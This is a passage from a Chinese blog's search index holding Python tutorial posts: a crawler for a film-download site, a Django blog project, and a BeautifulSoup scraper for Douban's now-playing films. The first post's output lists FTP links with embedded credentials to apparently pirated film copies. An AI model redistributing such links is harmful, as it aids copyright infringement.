+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;td bgcolor=&quot;#fdfddf&quot; style=&quot;WORD-WRAP: break-word&quot;&gt;&lt;a href=&quot;ftp://ygdy8:ygdy8@y006.dygod.org:2096/[阳光电影www.ygdy8.com].我是路人甲(修正版).HD.720p.国语中字.rmvb&quot;&gt;ftp://ygdy8:ygdy8@y006.dygod.org:2096/[阳光电影www.ygdy8.com].我是路人甲(修正版).HD.720p.国语中字.rmvb</div></pre></td></tr></table></figure>
+<p>其实我们需要的就是这个href中的内容，拿到后存储到film_dic这个字典中。我们除了拿到下载地址还需要电影的名称，这个名称是没有经过处理的，所以直接去分析源码，然后取出来并存储就行了。</p>
+<p>以上功能都是在一个函数中实现的，下面需要调用这个函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">url = &quot;http://www.dytt8.net/html/gndy/dyzz/index.html&quot;</div><div class="line"></div><div class="line">for film_dic in get_films_sorted(url):</div><div class="line">    print film_dic[&apos;film_title&apos;]</div><div class="line">    print film_dic[&apos;download_url&apos;]</div></pre></td></tr></table></figure>
+<p>以下是运行结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line">2015年喜剧《我是路人甲 修正版》HD国语中字</div><div class="line">ftp://ygdy8:ygdy8@y006.dygod.org:2096/[阳光电影www.ygdy8.com].我是路人甲(修正版).HD.720p.国语中字.rmvb</div><div class="line">2015年范冰冰古装《王朝的女人・杨贵妃》HD国语中字</div><div class="line">ftp://ygdy8:ygdy8@y201.dygod.org:1382/[阳光电影www.ygdy8.com].王朝的女人・杨贵妃.HD.720p.国语中字.rmvb</div><div class="line">2015年古天乐余文乐任达华动作《谜城/迷城》HD国语中字</div><div class="line">ftp://ygdy8:ygdy8@y201.dygod.org:1381/[阳光电影www.ygdy8.com].谜城.HD.720p.国语中字.rmvb</div><div class="line">2015年喜剧《男人制造/灵魂的温度》HD国语中字</div><div class="line">ftp://ygdy8:ygdy8@y006.dygod.org:2095/[阳光电影www.ygdy8.com].男人制造.HD.720p.国语中字.rmvb</div><div class="line">2014年奇幻《故事中的故事》BD中英双字幕</div><div class="line">ftp://ygdy8:ygdy8@y201.dygod.org:1380/[阳光电影www.ygdy8.com].故事中的故事.BD.720p.中英双字幕.rmvb</div><div class="line">2015年孙红雷周冬雨《少年班》HD国语中字</div><div class="line">ftp://ygdy8:ygdy8@y006.dygod.org:2094/[阳光电影www.ygdy8.com].少年班.HD.720p.国语中字.rmvb</div><div class="line">2015年惊悚《7分钟》BD中英双字幕</div><div class="line">ftp://ygdy8:ygdy8@y006.dygod.org:2089/[阳光电影www.ygdy8.com].7分钟.BD.720p.中英双字幕.rmvb</div><div class="line">2014年惊悚《陡岸凶杀案》BD中英双字幕</div><div class="line">ftp://ygdy8:ygdy8@y201.dygod.org:1374/[阳光电影www.ygdy8.com].陡岸凶杀案.BD.720p.中英双字幕.rmvb</div><div class="line">2015年科幻动作《复仇者联盟2》HD中英双字幕</div><div class="line">ftp://ygdy8:ygdy8@y201.dygod.org:1371/[阳光电影www.ygdy8.com].复仇者联盟2.HD.720p.中英双字幕.rmvb</div><div class="line">2015年刘青云黄晓明《暴疯语》BD国粤双语中字</div><div class="line">ftp://ygdy8:ygdy8@y201.dygod.org:1370/[阳光电影www.ygdy8.com].暴疯语.BD.720p.国粤双语中字.mkv</div><div class="line">2015年杨千古天乐《可爱的你》BD国粤双语中字</div><div class="line">ftp://ygdy8:ygdy8@y006.dygod.org:2086/[阳光电影www.ygdy8.com].可爱的你.BD.720p.国粤双语中字.mkv</div><div class="line">2015年动作《杀破狼2之杀无赦》HD国语中字</div><div class="line">ftp://ygdy8:ygdy8@y201.dygod.org:1366/[阳光电影www.ygdy8.com].杀破狼2.HD.720p.国语中字.rmvb</div><div class="line">2015年悬疑惊悚《暗黑之地》BD中英双字幕</div><div class="line">ftp://ygdy8:ygdy8@y006.dygod.org:2082/[阳光电影www.ygdy8.com].暗黑之地.BD.720p.中英双字幕.rmvb</div><div class="line">2015年动作《疯狂的麦克斯：狂暴之路》BD中英双字幕</div><div class="line">ftp://ygdy8:ygdy8@y201.dygod.org:1364/[阳光电影www.ygdy8.com].疯狂的麦克斯：狂暴之路.BD.720p.中英双字幕.rmvb</div><div class="line">2015年悬疑动作《赤道/大峡谷/赤盗》BD国粤双语中字</div><div class="line">ftp://ygdy8:ygdy8@y006.dygod.org:2080/[阳光电影www.ygdy8.com].赤道.BD.720p.国粤双语中字.mkv</div><div class="line">2015年梁洛施主演剧情《念念》BD国语中字</div><div class="line">ftp://ygdy8:ygdy8@y201.dygod.org:1363/[阳光电影www.ygdy8.com].念念.BD.720p.国语中字.rmvb</div><div class="line">2014年动作《冰峰游戏/总统游戏》BD中英双字幕</div><div class="line">ftp://ygdy8:ygdy8@y006.dygod.org:2079/[阳光电影www.ygdy8.com].冰峰游戏.BD.720p.中英双字幕.rmvb</div><div class="line">2015年郑伊健郑中基喜剧《全力扣杀》BD国粤双语中字</div><div class="line">ftp://ygdy8:ygdy8@y201.dygod.org:1362/[阳光电影www.ygdy8.com].全力扣杀.BD.720p.国粤双语中字.mkv</div><div class="line">2014年科幻动作《机器人帝国》BD中英双字幕</div><div class="line">ftp://ygdy8:ygdy8@y201.dygod.org:1360/[阳光电影www.ygdy8.com].机器人帝国.BD.720p.中英双字幕.rmvb</div><div class="line">2015年科幻恐怖《天魔异种/孤海魔怪》BD中英双字幕</div><div class="line">ftp://ygdy8:ygdy8@y006.dygod.org:2077/[阳光电影www.ygdy8.com].天魔异种.BD.720p.中英双字幕.rmvb</div><div class="line">2015年剧情喜剧《小男孩》BD中英双字幕</div><div class="line">ftp://ygdy8:ygdy8@y006.dygod.org:2075/[阳光电影www.ygdy8.com].小男孩.BD.720p.中英双字幕.rmvb</div><div class="line">2015年爱情《时光尽头的恋人》BD中英双字幕</div><div class="line">ftp://ygdy8:ygdy8@y201.dygod.org:1358/[阳光电影www.ygdy8.com].时光尽头的恋人.BD.720p.中英双字幕.rmvb</div><div class="line">2015年动作喜剧《道士下山》HD国语中字</div><div class="line">ftp://ygdy8:ygdy8@y006.dygod.org:2071/[阳光电影www.ygdy8.com].道士下山.HD.720p.国语中字.rmvb</div><div class="line">2015年动作喜剧《别惹得州》BD中英双字幕</div><div class="line">ftp://ygdy8:ygdy8@y006.dygod.org:2068/[阳光电影www.ygdy8.com].别惹得州.BD.720p.中英双字幕.rmvb</div><div class="line">2014年惊悚《解除好友/杀讯》BD中英双字幕</div><div class="line">ftp://ygdy8:ygdy8@y201.dygod.org:1352/[阳光电影www.ygdy8.com].解除好友.BD.720p.中英双字幕.rmvb</div></pre></td></tr></table></figure>
+<p>github地址：<a href="https://github.com/lowkeynic4/crawl/blob/master/dianyingtiantang.py" target="_blank" rel="external">https://github.com/lowkeynic4/crawl/blob/master/dianyingtiantang.py</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> 爬虫 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> python </tag>
+            
+            <tag> 爬虫 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[django博客程序]]></title>
+      <url>/2015/07/django-blog/</url>
+      <content type="html"><![CDATA[<p><img src="http://7xljat.com1.z0.glb.clouddn.com/QQ截图20150906100936.jpg" alt=""></p>
+<p>下面是我将这个程序放在了新浪sea上，没有实名认证，所以上面有个提示<br><a href="http://tenshine.sinaapp.com" target="_blank" rel="external">http://tenshine.sinaapp.com</a></p>
+<ol>
+<li>支持markdown语法</li>
+<li>安装了bootstrap_admin后台，后台地址<a href="http://127.0.0.1:8000/admin/，账号密码都是nick" target="_blank" rel="external">http://127.0.0.1:8000/admin/，账号密码都是nick</a></li>
+<li>添加多说评论</li>
+<li>添加jiathis分享按钮</li>
+<li>添加cnzz统计，并显示在footer中<br>6.采用JQcloud实现标签云功能</li>
+<li>添加新浪微博秀</li>
+<li>支持tinymce富文本编辑器，但是和markdown冲突，我将调用tinymce的地方在admin.py中注释掉了</li>
+<li>url路由没有都写在主url.py中，而是写在了app的url.py中，符合复用思想。</li>
+<li>使用了默认的sqlite数据库，但是mysql数据的配置也写了，但是注释起来了，可以使用。</li>
+</ol>
+<p>必看和最初看the django book<br><a href="http://djangobook.py3k.cn/2.0/" target="_blank" rel="external">http://djangobook.py3k.cn/2.0/</a></p>
+<p>自强学堂，django book精简版<br><a href="http://www.ziqiangxuetang.com/django/django-tutorial.html" target="_blank" rel="external">http://www.ziqiangxuetang.com/django/django-tutorial.html</a></p>
+<p>简单blog<br><a href="http://andrew-liu.gitbooks.io/django-blog/content/index.html" target="_blank" rel="external">http://andrew-liu.gitbooks.io/django-blog/content/index.html</a></p>
+<p>简单blog<br><a href="http://muker.net/django-blog-two.html" target="_blank" rel="external">http://muker.net/django-blog-two.html</a></p>
+<p>也是一个简单blog程序<br><a href="http://django-web-app-book.wanqingwong.com/" target="_blank" rel="external">http://django-web-app-book.wanqingwong.com/</a></p>
+<p>@models.permalink讲解，关于get_absolute_url()<br><a href="http://my.oschina.net/ranvane/blog/336817?p=1" target="_blank" rel="external">http://my.oschina.net/ranvane/blog/336817?p=1</a></p>
+<p>我的这个blog是从以下项目改善而来<br><a href="https://github.com/tmacjx/my_site" target="_blank" rel="external">https://github.com/tmacjx/my_site</a></p>
+<p>正则表达式查询，url.py中需要用到<br><a href="http://www.cnblogs.com/huxi/archive/2010/07/04/1771073.html" target="_blank" rel="external">http://www.cnblogs.com/huxi/archive/2010/07/04/1771073.html</a></p>
+<p>以上的资料就是写出这个blog程序的所有资料，其他就是遇到问题时去baidu&amp;google了，在这提一点，我在写这个程序的过程中遇到的很多问题都是在stackoverflow中知道的，希望我和大家以后都多多使用。</p>
+<p>还有就是我的这个程序中的文章是我从freebuf中随便截取来的，只为有点文字，别无他用！</p>
+<p>以下就是我所用到的包</p>
+<ul>
+<li>bootstrap-admin==0.3.6</li>
+<li>Django==1.8.4</li>
+<li>Markdown==2.6.2</li>
+</ul>
+<p>以下是github地址：<br><a href="https://github.com/lowkeynic4/django-blog" target="_blank" rel="external">https://github.com/lowkeynic4/django-blog</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> django </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> python </tag>
+            
+            <tag> django </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[利用urllib2和bs4爬取豆瓣北京热播电影]]></title>
+      <url>/2015/07/crawl-douban-movie/</url>
+      <content type="html"><![CDATA[<p>在正式爬虫之前还有一些入门需要了解的知识点，以下是我入门时看的一点东西：</p>
+<ol>
+<li>Python爬虫入门一之综述</li>
+<li>Python爬虫入门二之爬虫基础了解</li>
+<li>Python爬虫入门三之Urllib库的基本使用</li>
+<li>Python爬虫入门四之Urllib库的高级用法</li>
+<li>Python爬虫入门五之URLError异常处理</li>
+<li>Python爬虫入门六之Cookie的使用</li>
+<li>Python爬虫入门七之正则表达式</li>
+<li>Python爬虫入门八之Beautiful Soup的用法</li>
+</ol>
+<p>（转载自：<a href="http://cuiqingcai.com/1052.html）" target="_blank" rel="external">http://cuiqingcai.com/1052.html）</a></p>
+<p>首先来张图：<br><img src="http://7xljat.com1.z0.glb.clouddn.com/图片1.png" alt=""><br>​</p>
+<p>这是最简单的爬虫了，就是给一个网址，然后从他的内容中利用正则或者bs4找出它的规律，最终将需要的东西提取出来。找需要的内容和内容所在位置的规律这就是自己需要根据网页源码来总结的了。</p>
+<p>虽然在一个页面中就有自己需要的所有内容了，但是这样也有差别：</p>
+<ul>
+<li>一种是向服务器直接提交一个网址后，服务器将所有要显示的内容一次性都给发过来；</li>
+<li>另一种就是利用ajax技术，并不是一次将所有内容都给用户返回而是在页面中有一个加载更多的按钮，如果用户想要看到更多的内容的话，通过点击按钮然后浏览器在发送新的内容的url请求。利用这种技术：可以在不重新加载整个页面的情况下，为页面的某部分更新，更多ajax内容请自行搜索，我们这个网址也有这么一个按钮，如下</li>
+</ul>
+<p><img src="http://7xljat.com1.z0.glb.clouddn.com/图片2.png" alt=""></p>
+<p>但是此爬虫不是利用了ajax技术，只是利用了JavaScript技术，将一部分内容隐藏了起来，你点击显示全部影片的按钮后，会将隐藏起来的内容在给你显示出来而已，上边这张图片最后一个电影是《三城记》，而从下面可以看“显示全部影片”按钮的上面还有很多影片，所以这就证实了我上面所说的没有利用ajax技术，只是隐藏起来了而已。<br><img src="http://7xljat.com1.z0.glb.clouddn.com/图片3.png" alt=""></p>
+<p>下面开始正式爬虫：<br>这个爬虫总共分三个步骤</p>
+<ul>
+<li>根据url取页面内容</li>
+<li>Bs4根据自己发现的规则来提取具体内容</li>
+<li>根据电影的星级排序</li>
+</ul>
+<p>首先获取网页内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">def get_films_sorted(url):</div><div class="line">    #urllib2.urlopen()函数不支持验证、cookie或者其它HTTP高级功能。要支持这些功能，必须使用build_opener()函数创建自定义Opener对象</div><div class="line">    headers = (&apos;User-Agent&apos;, &apos;Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36&apos;)</div><div class="line">    opener = urllib2.build_opener()  # create an OpenerDirector object</div><div class="line">    opener.addheaders = [headers]    # 设置http头</div><div class="line">    content = opener.open(url).read()  #请求url然后获取response回来的内容</div><div class="line">    #以上几步和urlopen()函数的功能相同</div><div class="line">    encoding = chardet.detect(content)[&apos;encoding&apos;]  #取得网页编码</div><div class="line">    content = content.decode(encoding, &apos;ignore&apos;)    #python内部编码为unicode,此处需要用decode将字符串转换为unicode，ignore为忽略非法字符，还有replace会用？代替非法字符</div></pre></td></tr></table></figure>
+<p>接下来用bs4来提取内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">soup = bs4.BeautifulSoup(content)</div><div class="line">   div_now_playing=soup.find(&apos;div&apos;, id=&apos;nowplaying&apos;)   # 返回第一个指定属性的div标签的所有内容</div><div class="line">   list_li_films = div_now_playing.findAll(&apos;li&apos;, class_=&quot;list-item&quot;)    # 返回一个包含所有li标签,class属性为&quot;list-item&quot;的列表</div></pre></td></tr></table></figure>
+<p>这样所有class为list-item的li标签就都存储到list_li_films中了，因为这样的li标签不止一个，所以需要用一个for循环进去依次提取需要的信息，下面是一个li标签</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line">&lt;li</div><div class="line">    id=&quot;24719063&quot;</div><div class="line">    class=&quot;list-item&quot;</div><div class="line">    data-title=&quot;烈日灼心&quot;</div><div class="line">    data-score=&quot;7.9&quot;</div><div class="line">    data-star=&quot;40&quot;</div><div class="line">    data-release=&quot;2015&quot;</div><div class="line">    data-duration=&quot;139分钟&quot;</div><div class="line">    data-region=&quot;中国大陆&quot;</div><div class="line">    data-director=&quot;曹保平&quot;</div><div class="line">    data-actors=&quot;邓超 / 段奕宏 / 郭涛&quot;</div><div class="line">    data-category=&quot;nowplaying&quot;</div><div class="line">    data-enough=&quot;True&quot;</div><div class="line">    data-showed=&quot;True&quot;</div><div class="line">    data-votecount=&quot;63345&quot;</div><div class="line">    data-subject=&quot;24719063&quot;</div><div class="line">&gt;</div><div class="line">    &lt;ul class=&quot;&quot;&gt;</div><div class="line">        &lt;li class=&quot;poster&quot;&gt;</div><div class="line">            &lt;a href=&quot;http://movie.douban.com/subject/24719063/?from=playing_poster&quot; class=ticket-btn target=&quot;_blank&quot; data-psource=&quot;poster&quot;&gt;</div><div class="line">                &lt;img src=&quot;http://img4.douban.com/view/movie_poster_cover/mpst/public/p2262236348.jpg&quot; alt=&quot;烈日灼心&quot; rel=&quot;nofollow&quot; class=&quot;&quot; /&gt;</div><div class="line">            &lt;/a&gt;</div><div class="line">        &lt;/li&gt;</div><div class="line">        &lt;li class=&quot;stitle&quot;&gt;</div><div class="line">            &lt;a href=&quot;http://movie.douban.com/subject/24719063/?from=playing_poster&quot;</div><div class="line">                class=&quot;ticket-btn&quot;</div><div class="line">                target=&quot;_blank&quot;</div><div class="line">                title=&quot;烈日灼心&quot;</div><div class="line">                data-psource=&quot;title&quot;&gt;</div><div class="line">                烈日灼心</div><div class="line">            &lt;/a&gt;</div><div class="line">        &lt;/li&gt;</div><div class="line">        &lt;li class=&quot;srating&quot;&gt;</div><div class="line">                    &lt;span class=&quot;rating-star allstar40&quot;&gt;&lt;/span&gt;</div><div class="line">                    &lt;span class=&quot;subject-rate&quot;&gt;7.9&lt;/span&gt;</div><div class="line">        &lt;/li&gt;</div><div class="line">        &lt;li class=&quot;sbtn&quot;&gt;</div><div class="line">            &lt;a href=&quot;http://movie.douban.com/subject/24719063/cinema/beijing/?from=playing_btn&quot;</div><div class="line">                target=&quot;_self&quot;</div><div class="line">                data-subject=&quot;24719063&quot;</div><div class="line">                data-psource=&quot;btn&quot;</div><div class="line">                data-title=&quot;烈日灼心&quot;</div><div class="line">                class=&quot;ticket-btn&quot;&gt;</div><div class="line">                    选座购票</div><div class="line">            &lt;/a&gt;</div><div class="line">        &lt;/li&gt;</div><div class="line">    &lt;/ul&gt;</div><div class="line">&lt;/li&gt;</div></pre></td></tr></table></figure>
+<p>其实我们需要获取的信息在li的属性里就都能拿到但是为了多介绍点bs4的用法，其中的两项：评分和星级就不从li中获取了，而是从下面包含其他部分中获取出来，具体代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"># 遍历每个电影</div><div class="line">    for li_film in list_li_films:</div><div class="line">        # 字典</div><div class="line">        film_dic = &#123;&#125;</div><div class="line">        if (li_film.ul.li[&apos;class&apos;] == [&apos;poster&apos;]):</div><div class="line">            # 提取相应信息</div><div class="line">            film_dic[&apos;film_name&apos;] = li_film.ul.li.img[&apos;alt&apos;]</div><div class="line">            film_dic[&apos;film_release&apos;] = li_film[&apos;data-release&apos;]</div><div class="line">            film_dic[&apos;film_actors&apos;] = li_film[&apos;data-actors&apos;]</div><div class="line">            film_dic[&apos;film_director&apos;] = li_film[&apos;data-director&apos;]</div><div class="line">            # 属性也可以用字典定义</div><div class="line">            if li_film.find(&apos;span&apos;, attrs=&#123;&apos;class&apos;: &apos;subject-rate&apos;&#125;):</div><div class="line">                # 如果有评分</div><div class="line">                film_dic[&apos;film_points&apos;] = li_film.find(&apos;span&apos;, &#123;&apos;class&apos;,&apos;subject-rate&apos;&#125;).string.strip()</div><div class="line">                film_dic[&apos;points&apos;] = float(film_dic[&apos;film_points&apos;])</div><div class="line">            else:</div><div class="line">                # 如果没评分</div><div class="line">                film_dic[&apos;film_points&apos;] = u&apos;暂无评分&apos;</div><div class="line">                film_dic[&apos;points&apos;] = 0</div><div class="line"></div><div class="line">            # stars为class属性的内容</div><div class="line">            stars = li_film.find(&apos;li&apos;, attrs=&#123;&apos;class&apos;: &apos;srating&apos;&#125;).span[&apos;class&apos;]</div><div class="line">            if stars[0] != &apos;rating-star&apos;:</div><div class="line">                # 没有评星</div><div class="line">                film_dic[&apos;film_stars&apos;] = u&apos;评价人数不足&apos;</div><div class="line">            else:</div><div class="line">                # 有评星</div><div class="line">                str_stars=stars[1]  #stars[1] = allstar25</div><div class="line">                #将allstar后面的数字转换出来</div><div class="line">                match = re.match(r&apos;^(\D+)(\d&#123;2&#125;)$&apos;, str_stars) #\D非数字 ^以什么开头 \d为数字 &#123;2&#125;为匹配前边两次 $以什么结尾</div><div class="line">                #match.groups()为全部上面括号里的内容，一个是allstar,另一个是25,序数从1开始,match.groups(2)就是25</div><div class="line">                film_dic[&apos;film_stars&apos;] = str(int(match.group(2)) / 10).decode(&apos;utf-8&apos;) + u&apos;颗星&apos;</div><div class="line">        films_list.append(film_dic)</div></pre></td></tr></table></figure>
+<p>我们定义了一个空的字典film_dic来追加存储获得的信息。可以看出获取评分和星级不是从li标签的属性中获取的，但也是利用bs4的find函数，而方式不同了。</p>
+<p>正则和bs4是写python爬虫的必备知识。</p>
+<p>通过字典的append，已经把页面中的所有信息都获取完了，现在还缺少最后一步就是按照评分排序一下，代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">films_list_sorted = sorted(films_list, key=lambda x:x[&apos;points&apos;], reverse = True)</div></pre></td></tr></table></figure>
+<p>这些功能都是些在一个函数中，现在只需在main中调用即可：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">if __name__==&quot;__main__&quot;:</div><div class="line">    url=&quot;http://movie.douban.com/nowplaying/beijing/&quot;</div><div class="line">    for film_dic in get_films_sorted(url):</div><div class="line">        print &quot;%-20s&quot;%(film_dic[&apos;film_name&apos;])+&quot;%-10s&quot;%str(film_dic[&apos;points&apos;])+&quot;%-10s&quot;%(film_dic[&apos;film_stars&apos;])</div></pre></td></tr></table></figure>
+<p>pycharm的输出结果如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">西游记之大圣归来            8.4       4颗星</div><div class="line">猛龙过江                8.2       4颗星</div><div class="line">烈日灼心                7.9       4颗星</div><div class="line">滚蛋吧！肿瘤君             7.7       4颗星</div><div class="line">亚马逊萌猴奇遇记            7.6       4颗星</div><div class="line">这里的黎明静悄悄            7.6       4颗星</div><div class="line">刺客聂隐娘               7.5       4颗星</div><div class="line">捉妖记                 7.2       3颗星</div><div class="line">终结者：创世纪             6.9       3颗星</div><div class="line">煎饼侠                 6.8       3颗星</div><div class="line">华丽上班族               6.4       3颗星</div><div class="line">落跑吧爱情               6.2       3颗星</div><div class="line">三城记                 6.1       3颗星</div><div class="line">情敌蜜月                5.4       3颗星</div><div class="line">黑猫警长之翡翠之星           5.3       3颗星</div><div class="line">桂宝之爆笑闯宇宙            5.0       2颗星</div><div class="line">洛克王国4：出发！巨人谷        4.5       2颗星</div><div class="line">天际浩劫                4.4       2颗星</div><div class="line">新娘大作战               4.0       2颗星</div><div class="line">百团大战                3.9       2颗星</div><div class="line">双生灵                 3.5       2颗星</div><div class="line">男神时代                3.4       2颗星</div><div class="line">赛尔号大电影5：雷神崛起        3.4       2颗星</div><div class="line">诡劫                  3.2       1颗星</div><div class="line">魔镜奇缘                2.8       1颗星</div><div class="line">枕边诡影                2.8       1颗星</div><div class="line">大变局之梦回甲午            2.8       1颗星</div><div class="line">开罗宣言                2.6       1颗星</div><div class="line">少年杨靖宇               2.5       1颗星</div><div class="line">穷途                  0         评价人数不足</div></pre></td></tr></table></figure>
+<p>这个可以说应该是最基本的爬虫了，代码已上传github。</p>
+<p>地址为：<a href="https://github.com/lowkeynic4/crawl/blob/master/doubandianying.py" target="_blank" rel="external">https://github.com/lowkeynic4/crawl/blob/master/doubandianying.py</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> 爬虫 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> python </tag>
+            
+            <tag> 爬虫 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+  
+  
+</search>
